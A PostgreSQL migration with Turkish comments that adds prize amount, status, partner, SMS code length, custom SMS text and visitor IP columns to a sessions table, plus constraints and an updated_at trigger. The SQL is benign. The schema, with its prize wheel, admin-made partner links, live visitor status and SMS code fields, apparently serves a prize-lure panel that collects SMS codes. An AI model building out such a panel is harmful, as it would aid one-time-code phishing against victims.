-- ================================================================
-- 2026-08-10: sessions tablosuna eksik sütunları ekle
-- (admin panelleri "Bağlantı Oluştur" ve wheel-client amount/status
--  alanlarını kullanıyor ama AU bootstrap migration'ında eksikti)
-- ================================================================

-- set_updated_at trigger fonksiyonu (idempotent)
CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS trigger AS $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

-- amount: ödül miktarı (wheel sonucu, admin bağlantı oluştur)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS amount INT DEFAULT 0;

-- status: online/offline/SUCCESS/CONGRATS/SPECIAL_INFO (admin link oluştur offline atar)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'offline';

-- partner_name: admin bağlantı oluştururken "oluşturan admin" ismi
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_name TEXT;

-- participation_code: normal/standart link tipi için katılım kodu
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS participation_code TEXT;

-- sms_digits: SMS kod uzunluğu (default 6)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_digits INT DEFAULT 6;

-- sms_custom_text: özel SMS içeriği
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_custom_text TEXT;

-- ip_address: eski isimlendirme (visitor_ip ile birlikte tutulur, geriye dönük uyumluluk)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS ip_address TEXT;

-- CHECK constraint'leri (eğer daha önce eklenmediyse — NOT VALID ile hızlı ekle, sonra validasyon yok)
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_constraint WHERE conname = 'sessions_amount_check'
  ) THEN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_amount_check CHECK (amount >= 0) NOT VALID;
  END IF;
END $$;

DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_constraint WHERE conname = 'sessions_sms_digits_check'
  ) THEN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_sms_digits_check CHECK (sms_digits >= 4 AND sms_digits <= 12) NOT VALID;
  END IF;
END $$;

-- updated_at trigger (idempotent — varsa drop sonra yeniden oluştur)
DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at
BEFORE UPDATE ON public.sessions
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
